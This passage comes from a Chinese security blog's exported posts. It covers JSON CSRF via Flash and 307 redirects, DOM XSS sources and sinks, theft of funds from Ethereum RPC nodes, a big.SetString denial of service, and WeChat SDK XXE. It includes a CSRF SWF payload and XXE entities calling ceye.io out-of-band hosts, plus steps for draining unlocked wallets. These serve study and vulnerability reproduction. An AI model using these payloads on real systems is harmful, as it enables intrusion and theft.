true来解决。 这个时候需要注意需要后端配合设置实际的origin，不能为* ） 遇到cors跨域请求不通过的时候flash + 307 跳转就可以派上用场了。 flash + 307 即SWF_JSON_CSRF-待补充参考 https://github.com/sp1d3r/swf_json_csrf as编辑swf文件编辑修改swf文件这里我用的是ffdec构造payload如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package&#123; import flash.display.Sprite; import flash.net.URLLoader; import flash.net.URLRequest; import flash.net.URLRequestHeader; import flash.net.URLRequestMethod; public class re extends Sprite &#123; public function re() &#123; var member1:Object = null; var myJson:String = null; Wonderfl.capture(stage); super(); Wonderfl.capture(stage); member1 = new Object(); member1 = &#123; &quot;name&quot;:&quot;attacker&quot;, &quot;email&quot;:&quot;attacker@gmail.com&quot; &#125;; var myData:Object = member1; myJson = JSON.stringify(myData); myJson = JSON.stringify(myData); var url:String = &quot;http://xxxxx.ceye.io&quot;; var request:URLRequest = new URLRequest(url); request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;)); request.data = myJson; request.method = URLRequestMethod.POST; var urlLoader:URLLoader = new URLLoader(); try &#123; urlLoader.load(request); return; &#125; catch(e:Error) &#123; trace(e); return; &#125; &#125; &#125;&#125; php307 跳转 由于307跳转会带上原有的数据格式和类型，所以使用307跳转 如：1234567&lt;?php// redirect automaticallyheader(&quot;Location: https://xx.xxx.xx/xx&quot;, true, 307);?&gt; 参考123456789101112http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.htmlhttps://my.oschina.net/hccake/blog/886602https://www.freebuf.com/articles/web/164234.htmlhttps://www.cnblogs.com/blacksunny/p/7930126.htmlhttp://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/https://github.com/sp1d3r/swf_json_csrfhttps://github.com/bottlepy/bottle/issues/616https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.htmlhttps://www.csdn.net/article/2015-07-14/2825207https://book.2cto.com/201310/34316.htmlhttp://blog.knownsec.com/2014/06/flashupload_csrf_attacking/http://cm2.pw/ 补充CORS与JSONP的区别-待补充JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。","categories":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/categories/Web渗透/"},{"name":"安全策略","slug":"Web渗透/安全策略","permalink":"http://yoursite.com/categories/Web渗透/安全策略/"}],"tags":[]},{"title":"DOM XSS从javascript中输出数据到HTML页面","slug":"xss/DOM-XSS漏洞挖掘与攻击面延伸","date":"2019-07-21T04:31:46.284Z","updated":"2019-07-21T04:31:46.375Z","comments":true,"path":"2019/07/21/xss/DOM-XSS漏洞挖掘与攻击面延伸/","link":"","permalink":"http://yoursite.com/2019/07/21/xss/DOM-XSS漏洞挖掘与攻击面延伸/","excerpt":"","text":"DOM XSS从javascript中输出数据到HTML页面 存储或反射型XSS是从服务端输出到HTML页面 常见位置URL代入页面定义：通过js直接获取url中的参数，然后输出到HTML页面 通过window.location.search获取页面url传递的参数 1234567891011121314function GetQueryString(name) &#123; var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;); var r = decodeURI(window.location.search.substr(1)).match(reg); if (r != null)return unescape(r[2]); return null;&#125;var sname = GetQueryString(&quot;name&quot;);if(sname!=null)&#123; var sname_ = decodeURIComponent(sname); alert(sname_);&#125; #获取具体参数 document.getElementById(&apos;foo&apos;).innerHTML = getUrlParam(&apos;foo&apos;) #dom型XSS问题 此时取值时，匹配的URL是location.href，这个值包含了 location.search 和 location.hash 的值，而 location.hash 的值是不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值 location.search:获取问号后面的参数如：1http://www.runoob.com/submit.htm?email=someone@ example.com 通过document.write(location.search);获取到的是1?email=someone@example.com location.hash:获取url的锚部分，从“#”开始到最后，都是锚部分，不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值。 跳转类在 javascript 语法中，使用如下代码可以将页面进行跳转操作12345678910111213141516171819202122232425262728293031location.href = urlparams.redirecturl;&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; function jump()&#123; window.location.href=&quot;javascript:alert(1)&quot;; &#125; &lt;/script&gt; &lt;button type=&quot;button&quot; onclick=&quot;jump()&quot;&gt;test&lt;/button&gt; &lt;/body&gt;&lt;/html&gt;附：//顶层窗口跳转//top.location.href=&apos;http://www.baidu.com&apos;;//父层窗口跳转//parent.location.href=&apos;http://www.baidu.com&apos;;//以下均为本页面跳转//window.location.href=&quot;http://www.baidu.com&quot;;//location.href=&quot;http://www.baidu.com&quot;;//self.location.href=&quot;http://www.baidu.com&quot;;//this.location.href=&quot;http://www.baidu.com&quot;;//location.href=&quot;http://www.baidu.com&quot;;document.location.href 这样的跳转通常会出现在登录页、退出页、中间页。如果开发者让用户可以控制 redirecturl 参数，就可以使用 javascript:alert(1) 的形式进行XSS攻击。最近几年的APP开发比较热门，通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多。 测试关注点 输入点123456789101112document.locationdocument.URLdocument.URLUnencodeddocument.referrerwindow.location（href hash）所有的inputswindow.namedocument.cookieXMLhttpRequest返回的数据localstorage····· 以下几个地方是js输出到HTML的必经之路 输出点123456789document.write()document.writeln()xxx.innerHTML=xxx.outerHTML=innerHTML.replace=document.attachEvent()window.attachEvent()document.location.replace()document.location.assign() 缓存类开发者在缓存前端数据的时候，通常会存在 sessionStorage , localStorage , cookie 中，因为 sessionStorage 在页面刷新时就失效的特性，利用方式相对简单的只有后面两种。 参考学习12345https://code.google.com/archive/p/domxsswiki/ domxss 备忘单https://cstcamaro.github.io/post/2018-ISC-%E6%BC%94%E8%AE%B2%E7%A8%BF?tdsourcetag=s_pctim_aiomsghttp://blog.nsfocus.net/xss-advance/#23_DOM","categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/categories/Web安全/"},{"name":"XSS","slug":"Web安全/XSS","permalink":"http://yoursite.com/categories/Web安全/XSS/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"}]},{"title":"ETH 漏洞复现","slug":"区块链/ETH/ETH-1/偷渡漏洞_拒绝服务","date":"2019-03-13T16:00:00.000Z","updated":"2019-07-21T04:31:46.067Z","comments":true,"path":"2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/","link":"","permalink":"http://yoursite.com/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/","excerpt":"","text":"[TOC] ETH系统环境 ubuntu 16 搭建私有测试链 下载相关的go-ethereum 协议 git clone https://github.com/ethereum/go-ethereum.git 安装go环境 wget https://dl.google.com/go/go1.12.linux-amd64.tar.gz tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz 修改配置环境vim ~/.bashrc123export GOROOT=/usr/local/goexport GOPATH=/home/go_demoexport PATH=$PATH:$GOPATH:/usr/local/go/bin make geth 连接测试网络 因为仅仅是作为测试链来使用，这里就不连接到主网了，毕竟同步数据会消耗长时间和硬盘。 ./build/bin/geth –testnet console 开启json-rpc 端口 geth –rpc –rpcaddr –rpcport RPC常用调用格式 1cur addr:port -X POST --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:id, &quot;method&quot;:&quot;$&#123;method&#125;&quot;,&quot;params&quot;:&quot;$&#123;params&#125;&quot;&#125;&apos; 创建私有链-待续部署测试合约-待续合约创建子链-待续 ETH 节点JSON-RPC测试RPC接口：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364web3_clientVersionweb3_sha3net_versionnet_peerCountnet_listeningeth_protocolVersioneth_syncingeth_coinbaseeth_miningeth_hashrateeth_gasPriceeth_accountseth_blockNumbereth_getBalanceeth_getStorageAteth_getTransactionCounteth_getBlockTransactionCountByHasheth_getBlockTransactionCountByNumbereth_getUncleCountByBlockHasheth_getUncleCountByBlockNumbereth_getCodeeth_signeth_sendTransactioneth_sendRawTransactioneth_calleth_estimateGaseth_getBlockByHasheth_getBlockByNumbereth_getTransactionByHasheth_getTransactionByBlockHashAndIndexeth_getTransactionByBlockNumberAndIndexeth_getTransactionReceipteth_getUncleByBlockHashAndIndexeth_getUncleByBlockNumberAndIndexeth_getCompilerseth_compileLLLeth_compileSolidityeth_compileSerpenteth_newFiltereth_newBlockFiltereth_newPendingTransactionFiltereth_uninstallFiltereth_getFilterChangeseth_getFilterLogseth_getLogseth_getWorketh_submitWorketh_submitHashratedb_putStringdb_getStringdb_putHexdb_getHexshh_postshh_versionshh_newIdentityshh_hasIdentityshh_newGroupshh_addToGroupshh_newFiltershh_uninstallFiltershh_getFilterChangesshh_getMessages 创建钱包启动节点后，调用节点自身的console，创建账号1&gt; eth.accounts 查询钱包用户1&gt; personal.newAccount() 创建钱包用户这里注意下，当一个节点绑定多个钱包账户的时候，挖矿的收益会默认在第一个创始账户中，这个时候要改变收益账号12&gt; miner.setEtherbase(eth.accounts[1])成功改变会返回 true 查询获益钱包账户1&gt; eth.coinbase 1&gt;personal.unlockAccount(address,passwd,time) 解锁钱包用户 查询余额1curl -X POST -H &quot;Content-Type&quot;:application/json --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;eth_getBalance&quot;,&quot;params&quot;:[&quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;,&quot;latest&quot;],&quot;id&quot;:67&#125;&apos; 172.25.0.10:8545 发起转账请求123456curl -X POST -H &quot;Content-Type&quot;:application/json --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;: [&#123; &quot;from&quot;: &quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;, &quot;to&quot;: &quot;0xd64a66c28a6ae5150af5e7c34696502793b91ae7&quot;, &quot;value&quot;: &quot;0x1&quot;&#125;],&quot;id&quot;:67&#125;&apos; 172.25.0.10:8545 但是注意一下在此处的 当余额为0的时候，会报错，报错信息如下：1&quot;error&quot;:&#123;&quot;code&quot;:-32000,&quot;message&quot;:&quot;exceeds block gas limit&quot;&#125; 待深究 其中 personal_listWallets 接口可以查看所有账户的解锁情况。 偷渡漏洞验证以太坊交易流程1234567用户发起转账请求。以太坊对转账信息进行签名校验签名后的信息并将信息加入交易缓存池 (txpool)从交易缓存池中提取交易信息进行广播 此处的核心便是对personal_unlockAccount的爆破攻击，在爆破成功后或者用户自身交易解锁的空余时间内，对该接口进行解锁，在解锁后，攻击者便调用转账函数，对该接口以较高的gas进行转账处理。 防范方法：1personal.sendTransaction 进行转账 关于 personal.sendTransaction与personal_unlockAccount对区别这也就意味着如果执行了 unlockAccount() 函数、没有超时的话，从 ipc、rpc 调用 SendTransaction() 都会成功签名相关交易 偷渡漏洞接口爆破爆破的目标personal_unlockAccount 接口变成了 personal_sendTransaction 接口 开启挖矿1curl -X POST -H &quot;Content-Type&quot;:application/json --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;miner_start&quot;,&quot;params&quot;:[],&quot;id&quot;:67&#125;&apos; 172.25.0.10:8545 或者 用本地console1miner.start(1) 漏洞复现这里用docker 环境下的python3.6docker run -it python:3.6 /bin/bash 探测节点端口是否开放、获取当前区块高度直接调用RPC 8545端口 123&gt;&gt;&gt; from web3 import Web3,HTTPProvider&gt;&gt;&gt; web3=Web3(HTTPProvider(\"http://xx.xx.xx.xx:8545/\"))&gt;&gt;&gt; web3.eth.blockNumber 探测节点上是否绑定有相关账户1&gt;&gt;&gt; web3.eth.accounts 查询下账户相关余额1&gt;&gt;&gt; web3.eth.getBalance(web3.eth.accounts[]) 调用RPC爆破账户轮询监控节点解锁账户解锁期间进行转账没什么可写的，就是用个循环，调用web3.eth.sendTransaction 不停的进行转账请求 离线状态下偷渡漏洞跟偷渡漏洞实质没有区别，只是区别在于，不是在解锁期间进行转账，是在解锁期间调用转账签名eth_signTransaction，在账户解锁期间按照 nonce 递增的顺序构造多笔转账的签名，然后再在攻击者自己的节点上根据签名返回的raw 对签名进行广播，eth.sendRawTransaction(raw),达到转账的目的 轻节点的拒绝服务漏洞-待分析 知识简介：同步区块数据中，P2P模式，也分为客户端和服务端，在这其中，获取数据的是客户端，推送数据的属于服务端。 漏洞分析漏洞成因漏洞主要利用的是轻节点协议LES协议，复现前先缕一下这个函数及其功能。 LES协议全称：Light Ethereum Subprotocol以太坊三层协议中的上层协议 层1 以太坊应用层协议: eth协议、les协议 层2 p2p 通信链路 层3 go语言的网络IO层 漏洞复现les/handler.go12345678910111213141516171819202122232425262728 case query.Origin.Hash != (common.Hash&#123;&#125;) &amp;&amp; !query.Reverse: // Hash based traversal towards the leaf block if header := pm.blockchain.GetHeaderByNumber(origin.Number.Uint64() + query.Skip + 1); header != nil &#123; if pm.blockchain.GetBlockHashesFromHash(header.Hash(), query.Skip+1)[query.Skip] == query.Origin.Hash &#123; query.Origin.Hash = header.Hash() &#125; else &#123; unknown = true &#125; &#125; else &#123; unknown = true &#125; case query.Reverse: // Number based traversal towards the genesis block if query.Origin.Number &gt;= query.Skip+1 &#123; query.Origin.Number -= (query.Skip + 1) &#125; else &#123; unknown = true &#125; case !query.Reverse: // Number based traversal towards the leaf block query.Origin.Number += (query.Skip + 1) &#125;&#125;bv, rcost := p.fcClient.RequestProcessed(costs.baseCost + query.Amount*costs.reqCost)pm.server.fcCostStats.update(msg.Code, query.Amount, rcost)return p.SendBlockHeaders(req.ReqID, bv, headers) eth/handler.go 365-385 此处已修复123456789101112131415161718192021case query.Origin.Hash != (common.Hash&#123;&#125;) &amp;&amp; !query.Reverse: // Hash based traversal towards the leaf block var ( current = origin.Number.Uint64() next = current + query.Skip + 1 ) if next &lt;= current &#123; infos, _ := json.MarshalIndent(p.Peer.Info(), &quot;&quot;, &quot; &quot;) p.Log().Warn(&quot;GetBlockHeaders skip overflow attack&quot;, &quot;current&quot;, current, &quot;skip&quot;, query.Skip, &quot;next&quot;, next, &quot;attacker&quot;, infos) unknown = true &#125; else &#123; if header := pm.blockchain.GetHeaderByNumber(next); header != nil &#123; if pm.blockchain.GetBlockHashesFromHash(header.Hash(), query.Skip+1)[query.Skip] == query.Origin.Hash &#123; query.Origin.Hash = header.Hash() &#125; else &#123; unknown = true &#125; &#125; else &#123; unknown = true &#125; &#125; SetString导致的OOM拒绝服务漏洞分析根据分析，go语言中在使用math.big.Rat.SetString的时候，如果对传入的需要转换的函数没有相应的检测的时候，在传入其值为一个很大的浮点数的字符串的时候，就可能导致CPU耗尽的拒绝服务。big.NewInt(0).SetString同样存在 测试样例这里简单调用下该模块，检查其对传入的很大的浮点型字符串时的处理1234567891011121314151617181920package mainimport ( \"fmt\" \"math/big\" \"os\")func Test(test string) () &#123; num, success := new(big.Rat).SetString(test); if success &#123; fmt.Print(num); &#125;&#125;func main()&#123; fmt.Println(os.Args) for i := 0; i &lt; len(os.Args); i++ &#123; fmt.Println(os.Args[i]) &#125; Test(os.Args[1]);&#125; 测试结果图：此处可以明显看到通过OS传入的浮点型参数1e111111111，此时CPU升到100% 不过当浮点数 123456789101112131415161718func main()&#123; type txdata struct &#123; AccountNonce string `json:\"nonce\"` Price string `json:\"gasPrice\"` GasLimit string `json:\"gas\"` Recipient string `json:\"to\"` Amount string `json:\"value\"` Payload string `json:\"input\"` &#125; var dec txdata data := []byte(\"&#123;\\\"nonce\\\":\\\"2\\\",\\\"gasPrice\\\":1000000000000000000,\\\"gas\\\":\\\"50000\\\",\\\"to\\\":\\\"0x3fac0b8a3d21f8565b7446c6cc9e932badfb186c\\\",\\\"value\\\":\\\"20000\\\",\\\"input\\\":\\\"0x\\\"&#125;\") if err := json.Unmarshal(data, &amp;dec); err != nil &#123; fmt.Println(err); &#125; price := big.NewInt(0) price.SetString(dec.Price, 0);&#125; 漏洞分析看过测试用例后，这里我们实际分析一个最近看到的公链上漏洞。 定位漏洞这里根据代码审计中最简单的漏洞定位方法，因为知道了math.big.SetString存在问题,这里就去寻找，然后察看是否有可疑参数传入这里我们定位到了go-ethernum/cmd/geth/accountcmd.go 文件中 123456789101112131415161718192021222324252627282930313233343536373839404142434445func signTx(ctx *cli.Context) error &#123; prikey := ctx.Args().First() if len(prikey) == 0 &#123; fmt.Println(\"&#123;error1&#125;\") return errors.New(\"no prikey\") &#125; key, err := crypto.LoadECDSA(prikey) if err != nil &#123; fmt.Println(\"&#123;error2&#125;\") return err &#125; jsonstr := ctx.GlobalString(utils.PasswordFileFlag.Name) log.Info(jsonstr) type txdata struct &#123; AccountNonce string `json:\"nonce\"` Price string `json:\"gasPrice\"` GasLimit string `json:\"gas\"` Recipient string `json:\"to\"` Amount string `json:\"value\"` Payload string `json:\"input\"` &#125; var dec txdata if err := json.Unmarshal([]byte(jsonstr), &amp;dec); err != nil &#123;//go的json解析 fmt.Println(\"&#123;error3&#125;\") return err &#125; nonce, err := strconv.ParseUint(dec.AccountNonce, 0, 64) if err != nil &#123; fmt.Println(\"&#123;error4&#125;\") return err &#125; amount := big.NewInt(0) amount.SetString(dec.Amount, 0) price := big.NewInt(0) price.SetString(dec.Price, 0) gas := big.NewInt(0) gas.SetString(dec.GasLimit, 0) tx := types.NewTransaction(nonce, common.HexToAddress(dec.Recipient), amount, gas, price, []byte(dec.Payload)) s := types.NewEIP155Signer(big.NewInt(15)) sign, err := types.GetRowTransaction(s, tx, key) if err != nil &#123; fmt.Println(\"&#123;error5&#125;\") return err &#125; fmt.Println(\"&#123;\" + sign + \"&#125;\") 简单的看了下，此处是对以太坊交易的功能，稍微理下流程：转账请求： 进行请求的时候，可以有三种方式：调用JSON-RPC123456curl -X POST -H &quot;Content-Type&quot;:application/json --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;: [&#123; &quot;from&quot;: &quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;, &quot;to&quot;: &quot;0xd64a66c28a6ae5150af5e7c34696502793b91ae7&quot;, &quot;value&quot;: &quot;0x1&quot;&#125;],&quot;id&quot;:67&#125;&apos; 172.25.0.10:8545 调用js console 1eth.sendTransaction(&#123;&quot;from&quot;:eth.accounts[0],to:eth.accounts[1],value:web3.toWei(10,&apos;ether&apos;)&#125;) 调用web3.js ，实质还是调用了js console API 1web3.eth.sendTransaction(\"from\":eth.accounts[0],to:eth.accounts[1],value:web3.toWei(10,'ether')&#125;) 流程如下： 用户输入转账的地址和转入的地址和转出的金额 系统通过转出的地址的私钥对转账信息进行签名（用于证明这 笔交易确实有本人进行） 系统对交易信息进行验证 把这笔交易入到本地的txpool中（就是缓存交易池） 把交易信息广播给其它节点借用下seebug的图： 在用户输入调用web3.js后，传入参数进行交易，在此处调用ethapi接口：internal/ethapi/api.go 1071 1234567unc (s *PublicTransactionPoolAPI) SendTransaction(ctx context.Context, args SendTxArgs) (common.Hash, error) &#123; // Look up the wallet containing the requested signer account := accounts.Account&#123;Address: args.From&#125; wallet, err := s.b.AccountManager().Find(account) ...... 通过from来调取传入的账户地址 1234account := accounts.Account&#123;Address: args.From&#125;//接收from参数wallet, err := s.b.AccountManager().Find(account)//判断account是否存在func (am *Manager) Find(account Account) (Wallet, error) &#123; 通过交易信息生成type包 123456func (args *SendTxArgs) toTransaction() *types.Transaction &#123; if args.To == nil &#123; return types.NewContractCreation(uint64(*args.Nonce), (*big.Int)(args.Value), (*big.Int)(args.Gas), (*big.Int)(args.GasPrice), args.Data) &#125; return types.NewTransaction(uint64(*args.Nonce), *args.To, (*big.Int)(args.Value), (*big.Int)(args.Gas), (*big.Int)(args.GasPrice), args.Data)&#125; 对交易进行签名 1signed, err := wallet.SignTx(account, tx, chainID) 最后提交交易 1return submitTransaction(ctx, s.b, signed) 在这里推测是使用了big.NewInt.SetString函数，导致了此处的OOM造成了拒绝服务的风险。但是单独测试的后期并没复现成功，存在点问题，可能根本原因不在这，只在节点上测试成功。误打误撞的找到了这个节点漏洞。 漏洞复现在客户端console中，使用对应的转账函数，此时使用其中的转账函数，将其中的gasPrice、gasvalue、value的值使用为对应的16进制长数据将导致CPU占用。 1eth.sendTransaction() 坑点内存在内存资源不足的情况下，程序会自动退出。12goroutine 1340 [chan receive]:github.com/ethereum/go-ethereum/p2p/discover.(*udp). 在调用math.big.Rat.SetString的时候，浮点数过大会不解析，同样不会造成影响。 参考1234567https://blog.csdn.net/fpcc/article/details/81050976https://tianyun6655.github.io/2017/09/24/以太坊源码交易/https://www.colabug.com/3485978.htmlhttps://cloud.tencent.com/developer/section/1143071https://www.jianshu.com/p/1b0ffb58f565https://github.com/zsfelfoldi/go-ethereum/wiki/Light-Ethereum-Subprotocol-%28LES%29https://paper.seebug.org/656/","categories":[],"tags":[]},{"title":"XXE 示例及利用-java—SDK-1","slug":"Web渗透/XXE/XXE实例及利用2","date":"2019-01-28T14:21:04.000Z","updated":"2019-07-21T04:44:07.813Z","comments":true,"path":"2019/01/28/Web渗透/XXE/XXE实例及利用2/","link":"","permalink":"http://yoursite.com/2019/01/28/Web渗透/XXE/XXE实例及利用2/","excerpt":"","text":"[TOC] XXE实例分析在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。 ex1漏洞原理 微信SDK XXE漏洞分析1 没有找到原漏洞代码，看到原漏洞修复后代码：1https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip 在这个案例中，漏洞逻辑为：微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何文件，一般支付服务器均为核心服务器，出现XXE导致任意文件。另外，一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品。 因为白盒分析java实在有点强人所难，所以站在前人的肩膀上，一步到位，先看看出现这个漏洞的函数：12345678910111213141516171819202122232425262728src/main/java/com/github/wxpay/sdk/WXPayUtil文件public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception &#123; try &#123; Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder(); InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;)); org.w3c.dom.Document doc = documentBuilder.parse(stream); doc.getDocumentElement().normalize(); NodeList nodeList = doc.getDocumentElement().getChildNodes(); for (int idx = 0; idx &lt; nodeList.getLength(); ++idx) &#123; Node node = nodeList.item(idx); if (node.getNodeType() == Node.ELEMENT_NODE) &#123; org.w3c.dom.Element element = (org.w3c.dom.Element) node; data.put(element.getNodeName(), element.getTextContent()); &#125; &#125; try &#123; stream.close(); &#125; catch (Exception ex) &#123; // do nothing &#125; return data; &#125; catch (Exception ex) &#123; WXPayUtil.getLogger().warn(&quot;Invalid XML, can not convert to map. Error message: &#123;&#125;. XML content: &#123;&#125;&quot;, ex.getMessage(), strXML); throw ex; &#125; &#125; 这里 可以看出xmlToMap 方法用作将string转换成map,所用的xml解析器直接处理了xml字符串，这种直接处理xml字符串，在服务端没有禁止外部dtd应用的时候，造成了XXE漏洞。 详情分析123Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); 这个地方使用了java 中的hashmap，（Hash算法就是根据某个算法将一系列目标对象转换成地址，当要获取某个元素的时候，只需要将目标对象做相应的运算获得地址，直接获取。）对hashmap不熟悉的朋友可以看一下 https://www.cnblogs.com/dreamroute/p/3843600.html 关键解析出现在以下12org.w3c.dom.Document doc = documentBuilder.parse(stream);doc.getDocumentElement().normalize(); 其中，strXML的内存中数据流使用parse函数处理，跟踪parse函数123456789public Document parse(InputStream is) throws SAXException, IOException &#123; if (is == null) &#123; throw new IllegalArgumentException(&quot;InputStream cannot be null&quot;); &#125; InputSource in = new InputSource(is); return parse(in);&#125; return的parse（in） 类似于xml解析器 将xml转换为xmlDOM，涉及到到DOM解析XML，详情可以参考下1https://blog.csdn.net/guchuanhang/article/details/51866114 漏洞复现测试代码12345678910111213141516171819202122232425262728293031323334353637package com.github.wxpay.sdk;import java.util.Map;public class test1 &#123; public static void TestXxe()&#123; String xmlstr = &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;utf-8\\&quot;?&gt; \\n&quot; + &quot;&lt;!DOCTYPE xxe [\\n&quot; + &quot;&lt;!ELEMENT name ANY &gt;\\n&quot; + &quot;&lt;!ENTITY xxe SYSTEM \\&quot;file://1.txt\\&quot; &gt;]&gt;\\n&quot; + &quot;&lt;root&gt;\\n&quot; + &quot;&lt;name&gt;&amp;xxe;&lt;/name&gt;\\n&quot; + &quot;&lt;/root&gt;&quot;; try &#123; System.out.println(xmlstr); System.out.println(&quot;+++++++++++++++++=&quot;); //System.out.println(WXPayUtil.isSignatureValid(xmlstr,config.getkey())); Map&lt;String,String&gt; hm = WXPayUtil.xmlToMap(xmlstr); System.out.println(&quot;+++++++++++++++++=&quot;); System.out.println(hm); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argvs)&#123; System.out.println(&quot;11111&quot;); test2 test3 = new test2(); test3.Test2(); //WXPayUtil WXXxe = new WXPayUtil();//调用存在漏洞的代码 //WXXxe.mapToXml(); TestXxe(); &#125;&#125; 在下载的漏洞示例代码中，已经是更新后的代码了，所以为了使漏洞复现，得注释掉其中部分禁止函数。 当配置documentBuilderFactory.setFeature(“http://apache.org/xml/features/disallow-doctype-decl&quot;, true)为true时， 完全禁止DTD实体的使用1234在 com.github.wxpay.sdk.WXPayXmlUtil函数中，进行了安全配置documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); 报错：[Fatal Error] :2:10: 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。 单独将该配置该为false，可以使用内部实体调用12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe &quot;11111111&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;正常反馈&#123;name=111111&#125; 使用外部实体时，因为本例子中使用的其他防护措施中，导致了禁止外部实体,测试时可以将以下防护注释掉。这个时候就可以正常进行外部实体注入。 修复措施123456789src/main/java/com/github/wxpay/sdk/WXPayXmlUtil中documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false); documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true); documentBuilderFactory.setXIncludeAware(false); documentBuilderFactory.setExpandEntityReferences(false); 详情分析 参考：12http://xerces.apache.org/xerces2-j/features.html#external-general-entitieshttps://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5 ex2在简单分析了2018/07/03左右爆出来的微信SDK XXE漏洞函数后，可以回头来看一下CVE-2018-20318和CVE-2019-5312这两个CVE。 CVE-2018-20318 先看最开始的这个CVE：根据issus 889 漏洞原理已修复后漏洞代码如下：123456789101112131415161718private Document getXmlDoc() &#123; if (this.xmlDoc != null) &#123; return this.xmlDoc; &#125; try &#123; this.xmlDoc = DocumentBuilderFactory .newInstance() .newDocumentBuilder() final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); factory.setExpandEntityReferences(false); this.xmlDoc = factory.newDocumentBuilder() .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8))); return xmlDoc; &#125; catch (SAXException | IOException | ParserConfigurationException e) &#123; throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString); &#125; &#125; 根据对比：原漏洞代码：123456789101112131415private Document getXmlDoc() &#123; if (this.xmlDoc != null) &#123; return this.xmlDoc; &#125; try &#123; this.xmlDoc = DocumentBuilderFactory .newInstance() .newDocumentBuilder() .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8))); return xmlDoc; &#125; catch (SAXException | IOException | ParserConfigurationException e) &#123; throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString); &#125; &#125; 这里可以明显看到，parse创建了解析器，但没有如上的对外部实体进行禁止 坑点： 在复现的时候，最好使用maven项目，用pom直接导入所需组件。这里需要补充一下12345&lt;dependency&gt; &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt; &lt;artifactId&gt;xstream&lt;/artifactId&gt; &lt;version&gt;1.4.7&lt;/version&gt;&lt;/dependency&gt; 测试payload：123456789101112131415public void testToMap() throws Exception &#123; WxPayOrderQueryResult result = new WxPayOrderQueryResult(); result.setXmlString(&quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;UTF-8\\&quot;?&gt;\\n&quot; + &quot; \\n&quot; + &quot;&lt;!DOCTYPE ANY [\\n&quot; + &quot;&lt;!ENTITY test SYSTEM \\&quot;http://th9bvw.ceye.io\\&quot; 